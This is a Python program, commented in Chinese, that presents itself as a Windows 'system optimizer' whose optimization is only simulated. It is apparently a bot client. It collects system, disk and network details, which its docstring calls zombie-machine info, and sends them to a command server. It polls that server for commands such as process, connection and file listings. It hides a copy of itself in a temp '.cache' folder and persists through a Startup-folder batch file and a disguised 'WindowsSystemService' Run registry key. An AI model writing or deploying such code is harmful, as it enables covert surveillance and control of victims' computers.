import os
import sys
import platform
import psutil
import logging
import json
from datetime import datetime
import requests
import time
import winreg
import getpass
import shutil
import tempfile

# 配置日誌記錄
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def send_data_to_server(data):
    """將收集到的數據發送到服務器"""
    try:
        response = requests.post('http://127.0.0.1:5000/receive_data', json=data)  # 替換為你的服務器 URL
        if response.status_code == 200:
            logging.info("數據成功發送到服務器")
        else:
            logging.error(f"發送數據到服務器失敗，狀態碼: {response.status_code}")
    except Exception as e:
        logging.error(f"發送數據到服務器時出錯: {str(e)}")

def collect_system_info(ip_address):
    """收集詳細的系統信息並生成肉雞資訊"""
    try:
        system_info = {
            '操作系統': {
                '名稱': platform.system(),
                '版本': platform.version(),
                '架構': platform.machine(),
                '處理器': platform.processor()
            },
            '內存': {
                '總量': psutil.virtual_memory().total,
                '可用': psutil.virtual_memory().available,
                '已用': psutil.virtual_memory().used,
                '使用率': psutil.virtual_memory().percent
            },
            '磁盤': {},
            '網絡': {
                '接口': [],
                '連接數': len(psutil.net_connections())
            },
            '時間戳': datetime.now().isoformat(),
            'ip_address': ip_address  # 添加 IP 地址
        }

        # 收集磁盤信息
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                system_info['磁盤'][partition.device] = {
                    'mountpoint': partition.mountpoint,
                    'filesystem': partition.fstype,
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free,
                    'percent': usage.percent
                }
            except Exception as e:
                logging.warning(f"獲取磁盤 {partition.device} 信息失敗: {str(e)}")

        # 收集網絡接口信息
        for interface, stats in psutil.net_if_stats().items():
            try:
                addrs = psutil.net_if_addrs().get(interface, [])
                addresses = []
                for addr in addrs:
                    addresses.append({
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'family': str(addr.family)
                    })
                
                system_info['網絡']['接口'].append({
                    'name': interface,
                    'addresses': addresses,
                    'status': 'up' if stats.isup else 'down',
                    'speed': stats.speed,
                    'mtu': stats.mtu
                })
            except Exception as e:
                logging.warning(f"獲取網絡接口 {interface} 信息失敗: {str(e)}")

        # 將數據發送到服務器
        send_data_to_server(system_info)

        return system_info

    except Exception as e:
        logging.error(f"收集系統信息時出錯: {str(e)}")
        return {'error': str(e)}

def optimize_system():
    """執行系統優化任務"""
    try:
        optimization_results = {
            '開始時間': datetime.now().isoformat(),
            '任務': []
        }

        # Memory optimization
        try:
            initial_memory = psutil.virtual_memory().percent
            # Simulate memory optimization
            optimization_results['任務'].append({
                'name': 'memory_optimization',
                'status': 'success',
                'initial': initial_memory,
                'final': psutil.virtual_memory().percent
            })
        except Exception as e:
            logging.error(f"Memory optimization failed: {str(e)}")
            optimization_results['任務'].append({
                'name': 'memory_optimization',
                'status': 'failed',
                'error': str(e)
            })

        # Disk optimization
        try:
            for disk in psutil.disk_partitions():
                if disk.fstype:
                    usage = psutil.disk_usage(disk.mountpoint)
                    optimization_results['任務'].append({
                        'name': f'disk_optimization_{disk.device}',
                        'status': 'success',
                        'device': disk.device,
                        'initial_free': usage.free,
                        'final_free': usage.free  # Simulated result
                    })
        except Exception as e:
            logging.error(f"Disk optimization failed: {str(e)}")
            optimization_results['任務'].append({
                'name': 'disk_optimization',
                'status': 'failed',
                'error': str(e)
            })

        optimization_results['結束時間'] = datetime.now().isoformat()
        return optimization_results

    except Exception as e:
        logging.error(f"系統優化失敗: {str(e)}")
        return {'error': str(e)}

def execute_command(command):
    """執行命令並返回結果"""
    try:
        # 解析命令
        cmd_parts = command.split()
        cmd_type = cmd_parts[0]
        
        # 系統信息收集命令
        if cmd_type == 'sysinfo':
            return {
                'type': 'system_info',
                'data': collect_system_info()
            }
        
        # 進程管理命令
        elif cmd_type == 'ps':
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                processes.append(proc.info)
            return {
                'type': 'process_list',
                'data': processes
            }
        
        # 網絡連接命令
        elif cmd_type == 'netstat':
            connections = []
            for conn in psutil.net_connections():
                connections.append({
                    'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    'status': conn.status,
                    'pid': conn.pid
                })
            return {
                'type': 'network_connections',
                'data': connections
            }
        
        # 文件操作命令
        elif cmd_type == 'ls':
            path = cmd_parts[1] if len(cmd_parts) > 1 else '.'
            files = []
            for entry in os.scandir(path):
                files.append({
                    'name': entry.name,
                    'path': entry.path,
                    'is_file': entry.is_file(),
                    'size': entry.stat().st_size if entry.is_file() else 0
                })
            return {
                'type': 'file_list',
                'data': files
            }
        
        return {
            'type': 'error',
            'message': f'不支持的命令: {command}'
        }
    except Exception as e:
        return {
            'type': 'error',
            'message': str(e)
        }

def check_commands():
    """檢查並執行新命令"""
    try:
        # 使用更可靠的連接設置
        response = requests.get(
            'http://127.0.0.1:5000/get_commands',
            timeout=5,
            headers={'Connection': 'keep-alive'}
        )
        if response.status_code == 200:
            commands = response.json().get('commands', [])
            for cmd in commands:
                result = execute_command(cmd['command'])
                # 添加錯誤重試機制
                max_retries = 3
                for attempt in range(max_retries):
                    try:
                        response = requests.post(
                            'http://127.0.0.1:5000/submit_result',
                            json={
                                'command_id': cmd['id'],
                                'result': result
                            },
                            timeout=5,
                            headers={'Connection': 'keep-alive'}
                        )
                        if response.status_code == 200:
                            break
                    except Exception as e:
                        if attempt == max_retries - 1:
                            logging.error(f"提交結果失敗: {str(e)}")
                        time.sleep(1)  # 重試前等待
    except requests.exceptions.ConnectionError:
        logging.warning("無法連接到服務器，等待重試...")
        time.sleep(5)  # 連接失敗時等待更長時間
    except Exception as e:
        logging.error(f"檢查命令時出錯: {str(e)}")
        time.sleep(1)

def add_to_startup():
    """添加到系統自啟動"""
    try:
        # 獲取當前用戶名
        username = getpass.getuser()
        
        # 複製到臨時目錄
        temp_dir = os.path.join(tempfile.gettempdir(), '.cache')
        os.makedirs(temp_dir, exist_ok=True)
        
        # 複製自身到臨時目錄
        current_path = os.path.abspath(__file__)
        target_path = os.path.join(temp_dir, 'system_service.py')
        shutil.copy2(current_path, target_path)
        
        # 創建啟動腳本
        bat_path = os.path.join(
            os.path.expanduser('~'),
            'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/system_service.bat'
        )
        
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n"{sys.executable}" "{target_path}"\n')
        
        # 添加註冊表項
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(
            key,
            'WindowsSystemService',
            0,
            winreg.REG_SZ,
            f'"{sys.executable}" "{target_path}"'
        )
        
        logging.info("成功添加到系統自啟動")
        return True
        
    except Exception as e:
        logging.error(f"添加自啟動失敗: {str(e)}")
        return False

def check_running_in_temp():
    """檢查是否在臨時目錄運行"""
    current_path = os.path.abspath(__file__)
    temp_dir = os.path.join(tempfile.gettempdir(), '.cache')
    return current_path.startswith(temp_dir)

def main():
    # 獲取本機 IP 地址
    ip_address = requests.get('https://api.ipify.org').text  # 使用外部服務獲取公共 IP 地址
    retry_count = 0
    max_retries = 5
    
    while True:
        try:
            collect_system_info(ip_address)  # 傳遞 IP 地址
            retry_count = 0  # 重置重試計數
            time.sleep(60)  # 每分鐘檢查一次新命令
        except KeyboardInterrupt:
            logging.info("程序被用戶中斷")
            break
        except Exception as e:
            retry_count += 1
            if retry_count >= max_retries:
                logging.error(f"達到最大重試次數 ({max_retries})，程序退出")
                break
            wait_time = min(60, retry_count * 5)  # 逐漸增加等待時間
            logging.error(f"發生錯誤: {str(e)}，{wait_time} 秒後重試...")
            time.sleep(wait_time)

if __name__ == '__main__':
    try:
        logging.info("系統優化器啟動中...")
        
        # 如果不在臨時目錄，則複製並重新啟動
        if not check_running_in_temp():
            logging.info("正在移動到臨時目錄...")
            if add_to_startup():
                logging.info("已添加到自啟動，退出當前實例")
                sys.exit(0)
        
        # 測試連接到服務器
        try:
            response = requests.get('http://127.0.0.1:5000/get_commands', timeout=5)
            if response.status_code == 200:
                logging.info("成功連接到命令服務器")
        except Exception as e:
            logging.warning(f"初始連接測試失敗: {str(e)}")
        
        sys.exit(main())
    except Exception as e:
        logging.error(f"程序異常退出: {str(e)}")
        sys.exit(1) 